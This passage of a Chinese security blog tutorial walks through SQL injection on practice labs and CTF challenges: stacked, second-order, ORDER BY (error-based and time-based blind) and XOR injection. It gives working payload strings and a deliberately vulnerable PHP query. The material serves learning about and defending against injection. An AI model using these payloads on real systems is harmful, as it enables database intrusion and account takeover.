+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1'</span>;RENAME TABLE `words` TO `words1`;RENAME TABLE `<span class="number">1919810931114514</span>` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(<span class="number">100</span>) ;show columns <span class="keyword">from</span> words;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+<p>用<code>1&#39; or &#39;1&#39;=&#39;1</code>访问一下，便可以发现flag</p>
+<p>通过这道题的训练，便可以对堆叠注入有很深的印象了</p>
+<h1 id="0x03-二次注入"><a href="#0x03-二次注入" class="headerlink" title="0x03 二次注入"></a><strong>0x03 二次注入</strong></h1><h3 id="涉及函数-2"><a href="#涉及函数-2" class="headerlink" title="涉及函数"></a>涉及函数</h3><p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串 </p>
+<p><code>mysql_real_escape_string()</code> 函数转义 SQL 语句中使用的字符串中的特殊字符 </p>
+<p><code>mysql_escape_string()</code> —  转义一个字符串 </p>
+<h3 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h3><p> 看到涉及到的函数是不是感觉很熟悉，这是因为大多数网站都会对用户输入的语句进行对特殊符号的过滤，例如：恶意用户构造的插入语句为<code>1&#39;</code>,经过这些函数的处理则变为<code>1\&#39;</code>,这样便可以防止用户向服务器插入数据时引发的一些恶意操作，但这只是中途过滤了一下，最终返回到数据库里面的数据还是<code>1&#39;</code>,如果管理者对取出的数据没有进行进一步的检验处理，服务器从数据库取出恶意数据，未经过滤就直接拼接SQL语句进行查询，就会发生了SQL二次注入。</p>
+<p><strong>注意</strong>：二次注入不是注入两次的意思，二次注入相当于存储型的注入，可以看下面的图，介绍的也很直观。<br><img src="https://img-blog.csdnimg.cn/20191028152937942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 总结起来 二次注入其实是分为两个步骤：</p>
+<ol>
+<li>插入恶意数据</li>
+<li><p>引用恶意数据</p>
+<p>原理既是如此，但不实战是无法掌握的，下面就来实战练习二次注入。</p>
+</li>
+</ol>
+<h3 id="题目实战-3"><a href="#题目实战-3" class="headerlink" title="题目实战"></a><strong>题目实战</strong></h3><p>SQL-labs24关便涉及到二次注入</p>
+<p>先来看一下登陆时的源码<br><img src="https://img-blog.csdnimg.cn/20191028160021678.png" alt="在这里插入图片描述"><br>过滤函数将特殊符号给过滤掉了，所以直接注入是没戏的</p>
+<p>再来查看一下用户注册的源码<br><img src="https://img-blog.csdnimg.cn/2019102816091291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>同样过滤特殊字符，从注册进行注入也是不可能了</p>
+<p>最后看一下修改密码的源码<br><img src="https://img-blog.csdnimg.cn/20191028161040638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>同样如此，那就只能利用二次注入，先将恶意语句注入进数据库中，再调用</p>
+<p>我们先注册一个用户<code>admin&#39;#</code>,密码设置为<code>123</code>，注册好之后查看一下数据库</p>
+<p><img src="https://img-blog.csdnimg.cn/20191028161448678.png" alt="在这里插入图片描述"><br>注册成功，这时其实我们就可以修改管理员<code>admin</code>，为什么那，来看下修改密码的sql语句</p>
+<p><img src="https://img-blog.csdnimg.cn/20191028161626175.png" alt="在这里插入图片描述"><br>我们用户名为<code>admin&#39;#</code>，调用该用户时，SQL语句则变为了<br><img src="https://img-blog.csdnimg.cn/20191028162019279.png" alt="在这里插入图片描述"><br>我们将<code>admin</code>密码更改为123456,测试一下<br><img src="https://img-blog.csdnimg.cn/20191028162206374.png" alt="在这里插入图片描述"><br>更改成功，这便是二次注入的简单利用</p>
+<h1 id="0x04-Order-By注入"><a href="#0x04-Order-By注入" class="headerlink" title="0x04 Order By注入"></a>0x04 Order By注入</h1><h3 id="涉及函数-3"><a href="#涉及函数-3" class="headerlink" title="涉及函数"></a><strong>涉及函数</strong></h3><p>if()函数<br>updatexml()函数<br>extractvalue()函数<br>regexp()函数<br>rand()函数</p>
+<h3 id="原理分析-3"><a href="#原理分析-3" class="headerlink" title="原理分析"></a>原理分析</h3><p>当用户提供的数据通过MySQL的<code>“Order By”</code>语句中的值进行传递时，如果可控制的位置在order by子句后，如order参数可控：<code>select * from xxxxx order by $_GET[&#39;order&#39;]</code>可能就会引发order by注入</p>
+<p>利用大师傅的环境简单复现一下，源码分析：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">mysql_connect(<span class="string">"127.0.0.1"</span>, <span class="string">"xxxx"</span>, <span class="string">"xxxx"</span>) <span class="function"><span class="keyword">or</span> <span class="title">die</span><span class="params">(<span class="string">"Database connection failed "</span>)</span></span>;</span><br><span class="line">mysql_select_db(<span class="string">"sqlidemo"</span>) <span class="function"><span class="keyword">or</span> <span class="title">die</span><span class="params">(<span class="string">"Select database failed"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">$order = $_GET['order'] ? $_GET['order'] : 'name';</span><br><span class="line">$sql = <span class="string">"select id,name,price from goods order by $order"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$reslist = <span class="built_in">array</span>();</span><br><span class="line"><span class="keyword">while</span>($row = mysql_fetch_array($result, MYSQL_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"> array_push($reslist, $row);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">echo <span class="title">json_encode</span><span class="params">($reslist)</span></span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><code>if(语句1、语句2、语句3)</code>如果语句1为真，则执行语句2，否则则执行语句3</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?order=IF(<span class="number">1</span>=<span class="number">1</span>,name,price) 通过name字段排序</span><br><span class="line">/?order=IF(<span class="number">1</span>=<span class="number">2</span>,name,price) 通过price字段排序</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20191028232805548.png" alt="在这里插入图片描述"><br>简单介绍下SQL语句中<code>case</code> 的两种格式</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--简单Case函数</span><br><span class="line"><span class="keyword">case</span> 列名</span><br><span class="line">when   条件值<span class="number">1</span>   then  选项<span class="number">1</span></span><br><span class="line">when   条件值<span class="number">2</span>   then  选项<span class="number">2</span></span><br><span class="line"><span class="keyword">else</span>   默认值    end</span><br><span class="line"></span><br><span class="line">--Case搜索函数</span><br><span class="line"><span class="keyword">case</span>  </span><br><span class="line">when  列名=条件值<span class="number">1</span>   then  选项<span class="number">1</span></span><br><span class="line">when  列名=条件值<span class="number">2</span>   then  选项<span class="number">2</span></span><br><span class="line"><span class="keyword">else</span>  默认值 end</span><br></pre></td></tr></table></figure>
+<p>两种方式，可以实现相同的功能。简单<code>Case</code>函数的写法相对比较简洁，但是和<code>Case</code>搜索函数相比，功能方面会有些限制，比如写下面的判断式<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?order=(CASE+WHEN+(<span class="number">1</span>=<span class="number">1</span>)+THEN+name+ELSE+price+END) 通过name字段排序</span><br><span class="line">/?order=(CASE+WHEN+(<span class="number">1</span>=<span class="number">2</span>)+THEN+name+ELSE+price+END) 通过price字段排序</span><br></pre></td></tr></table></figure></p>
+<p>如果想利用构造的语句的话，直接将后面的选项更改成自己构造的语句即可<br><img src="https://img-blog.csdnimg.cn/20191028233246505.png" alt="在这里插入图片描述"><br><code>IFNULL()</code> 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值，所以也可以通过IFNULL来排序，甚至构造恶意语句<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?order=IFNULL(NULL,price) 通过price字段排序</span><br><span class="line">/?order=IFNULL(NULL,name) 通过name字段排序</span><br></pre></td></tr></table></figure></p>
+<p><strong>返回多条记录</strong></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?order=IF(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,(<span class="keyword">select</span>+<span class="number">1</span>+union+<span class="keyword">select</span>+<span class="number">2</span>)) 正确</span><br><span class="line">/?order=IF(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,(<span class="keyword">select</span>+<span class="number">1</span>+union+<span class="keyword">select</span>+<span class="number">2</span>)) 错误</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20191028234035390.png" alt="在这里插入图片描述"><br><strong>利用报错</strong></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?order=(<span class="keyword">select</span>+<span class="number">1</span>+regexp+<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 正常</span><br><span class="line">/?order=(<span class="keyword">select</span>+<span class="number">1</span>+regexp+<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 错误</span><br><span class="line">/?order=extractvalue(<span class="number">1</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,user())) 正确</span><br><span class="line">/?order=extractvalue(<span class="number">1</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,user())) 错误</span><br></pre></td></tr></table></figure>
+<p>利用if语句，也可以在参数order后构造时间盲注，同样也是这里虽然是简单的排序，但如果将语句更改为猜解数据库的语句也是可以的<br>如：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?order=<span class="keyword">if</span>(条件<span class="number">1</span>,<span class="number">1</span>,(SELECT(<span class="number">1</span>)FROM(SELECT(SLEEP(<span class="number">2</span>)))test)) 正常响应时间</span><br><span class="line">/?order=<span class="keyword">if</span>(条件<span class="number">1</span>,<span class="number">1</span>,(SELECT(<span class="number">1</span>)FROM(SELECT(SLEEP(<span class="number">2</span>)))test)) sleep <span class="number">2</span>秒</span><br></pre></td></tr></table></figure>
+<p>利用order by注入不可能直接爆出数据，只能通过猜解来获得数据，猜解数据时只能一位一位的猜，所以可以利用<code>substr</code>截取函数以及<code>left</code>、<code>right</code>函数将每个字符分割出来，进行猜解，如果遇到Order by注入，最好用脚本，手注得累死</p>
+<p>Order by注入就是通过这些函数，开发者本意是希望方便用户进行排序观察等，但如果不对其做出任何限制，就会被恶意利用，利用函数的功能去执行一些SQL注入语句，从而泄露信息。</p>
+<h3 id="题目实战-4"><a href="#题目实战-4" class="headerlink" title="题目实战"></a><strong>题目实战</strong></h3><p>使用SQL-labs46关做测试<br><img src="https://img-blog.csdnimg.cn/20191029100530160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用sort可以进行信息查询，可以通过<code>asc</code> 和<code>desc</code>查看返回数据是否相同来简单判断是否存在order  by注入,因为如果语句中不写<code>order by</code>，默认是按照表结构中定义的“主键”<code>(Primary Key)</code> 进行升序<code>（ASC）</code>排列，如果通过<code>asc</code> 和<code>desc</code>查看返回数据相同则不存在order  by注入，反之则存在。</p>
+<p>上面原理介绍也说过，order by注入依靠那些函数，所以我们可以构造任意的语句</p>
+<p>如：<strong>报错语句</strong></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">1</span> and(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>))),0))</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20191029101550674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下面的更改报错语句中的payload就可爆出其他内容</p>
+<p><strong>时间盲注</strong></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,(SELECT(<span class="number">1</span>)FROM(SELECT(SLEEP(<span class="number">10</span>)))test))</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20191029101834675.png" alt="在这里插入图片描述"><br>我们将前面的判断条件更改即可来猜解数据，例如：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="keyword">if</span>(ascii(substr((<span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)),1,1))&gt;200,1,(<span class="params">SELECT(<span class="number">1</span></span>)<span class="title">FROM</span>(<span class="params">SELECT(SLEEP(<span class="number">10</span></span>)))test))</span></span><br></pre></td></tr></table></figure>
+<p>这里我估计设置ascll大一点来测试是否可行，除此之外还可以利用rand函数</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(ascii(substr((<span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)),1,1))&gt;127)</span></span><br><span class="line"><span class="function">?sort</span>=rand(ascii(substr((<span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)),1,1))&gt;1)</span></span><br></pre></td></tr></table></figure>
+<p>发现回显内容是不同的，那如何判断是对是错，如何写出脚本<br><img src="https://img-blog.csdnimg.cn/20191029102828195.png" alt="在这里插入图片描述"><br>发现<code>ascll&gt;127</code>时最后显示的<code>admin1</code>,而<code>ascll&gt;1</code>时为<code>superman</code><br><img src="https://img-blog.csdnimg.cn/20191029102927862.png" alt="在这里插入图片描述"><br>经过多次测试<br><code>superman</code><em>代表正确<br><code>admin1</code></em>代表错误<br>即可写出盲注脚本，来猜解数据库、表等信息</p>
+<p>总结：这次就先总结到这里，SQL注入还有很多姿势，如异或注入等，</p>
+<h1 id="0x05-异或注入"><a href="#0x05-异或注入" class="headerlink" title="0x05 异或注入"></a><strong>0x05 异或注入</strong></h1><h3 id="涉及符号"><a href="#涉及符号" class="headerlink" title="涉及符号"></a><strong>涉及符号</strong></h3><p>MySQL中，异或用<code>^</code>或<code>xor</code>表示</p>
+<h3 id="原理分析-4"><a href="#原理分析-4" class="headerlink" title="原理分析"></a><strong>原理分析</strong></h3><p>异或注入原理较为简单一些，运算法则就是：两个条件相同（同真或同假）即为假<code>（0）</code>，两个条件不同即为真<code>（1）</code>，<code>null</code>与任何条件做异或运算都为<code>null</code></p>
+<p>简单在mysql命令行演示一下：<br><img src="https://img-blog.csdnimg.cn/20191029111003216.png" alt="在这里插入图片描述"><br>用异或方法可以判断一些字符是否被过滤，如:<br><img src="https://img-blog.csdnimg.cn/20191029111305924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>CTF题中如果想判断那些函数被过滤，便可以通过异或查询</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">符号^(str)^符号 -符号具体要结合题，str是由我们定义的命令</span><br></pre></td></tr></table></figure>
+<h3 id="题目实战-5"><a href="#题目实战-5" class="headerlink" title="题目实战"></a>题目实战</h3><p><img src="https://img-blog.csdnimg.cn/20191029210250162.png" alt="在这里插入图片描述"><br>当<code>id=5</code>时，显示出来这段提示，那就来SQL注入<br>输入<code>id=1&#39;</code>时报错<br><img src="https://img-blog.csdnimg.cn/20191029210400248.png" alt="在这里插入图片描述"><br>当输入<code>id=1&#39;%23</code>时不报错，输入<code>id=1&#39; and 1=1%23</code>又报错，看来是过滤了<code>and或者空格</code>，经测试发现是过滤了<code>and</code>，那肯定还有被过滤的字符，可以使用异或查询来判断出那个字符被过滤掉</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1'</span>^(length(<span class="string">'union'</span>)!=<span class="number">0</span>)^<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<p>这里可能会有点绕，故意设置成长度不等于0，假如<code>length(&#39;union&#39;)!=0</code>成立（真），则说明<code>union</code>未被过滤，则页面将会回显错误（因为同真即为假），如果<code>length(&#39;union&#39;)!=0</code>不成立（假），说明<code>union</code>确实已经被过滤掉了，则页面回显正常<br><img src="https://img-blog.csdnimg.cn/20191029211341894.png" alt="在这里插入图片描述"><br>页面回显正常，说明<code>length(&#39;union&#39;)==0</code>，故<code>union</code>被过滤掉了，同样的方法检测</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>,union,and,or</span><br></pre></td></tr></table></figure>
+<p>等字符被过滤掉</p>
+<p>下面通过双写绕过即可得出表名等，这里重点在于介绍异或查询这种方法，所以下面就不深究了。</p>
+<p>异或注入也是同样的原理，更改相应的<code>payload</code>即可</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h1><p>注入的方法真的很多，除此之外还有利用MySQL的SQL预处理进行注入等等，要学的内容还有很多，继续加油！</p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/10/27/通过sql-labs进行sql注入学习(11-22)/" title="通过sql-labs进行sql注入学习(11-22)">
+                    <div class="prevTitle">通过sql-labs进行sql注入学习(11-22)</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:12345@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/bealright" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/blog.csdn.net/qq_43431158" class="iconfont-archer csdn" target="_blank" title="csdn"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-Xpath报错注入"><span class="toc-number">2.</span> <span class="toc-text">0x00 Xpath报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及函数"><span class="toc-number">2.0.1.</span> <span class="toc-text">涉及函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错语句构造"><span class="toc-number">2.0.2.</span> <span class="toc-text">报错语句构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理分析"><span class="toc-number">2.0.3.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目实战"><span class="toc-number">2.0.4.</span> <span class="toc-text">题目实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-宽字节注入"><span class="toc-number">3.</span> <span class="toc-text">0x01 宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及函数-1"><span class="toc-number">3.0.1.</span> <span class="toc-text">涉及函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理分析-1"><span class="toc-number">3.0.2.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目实战-1"><span class="toc-number">3.0.3.</span> <span class="toc-text">题目实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-堆叠注入"><span class="toc-number">4.</span> <span class="toc-text">0x02 堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及字符"><span class="toc-number">4.0.1.</span> <span class="toc-text">涉及字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理分析-2"><span class="toc-number">4.0.2.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目实战-2"><span class="toc-number">4.0.3.</span> <span class="toc-text">题目实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-二次注入"><span class="toc-number">5.</span> <span class="toc-text">0x03 二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及函数-2"><span class="toc-number">5.0.1.</span> <span class="toc-text">涉及函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二次注入原理"><span class="toc-number">5.0.2.</span> <span class="toc-text">二次注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目实战-3"><span class="toc-number">5.0.3.</span> <span class="toc-text">题目实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-Order-By注入"><span class="toc-number">6.</span> <span class="toc-text">0x04 Order By注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及函数-3"><span class="toc-number">6.0.1.</span> <span class="toc-text">涉及函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理分析-3"><span class="toc-number">6.0.2.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目实战-4"><span class="toc-number">6.0.3.</span> <span class="toc-text">题目实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-异或注入"><span class="toc-number">7.</span> <span class="toc-text">0x05 异或注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及符号"><span class="toc-number">7.0.1.</span> <span class="toc-text">涉及符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理分析-4"><span class="toc-number">7.0.2.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目实战-5"><span class="toc-number">7.0.3.</span> <span class="toc-text">题目实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
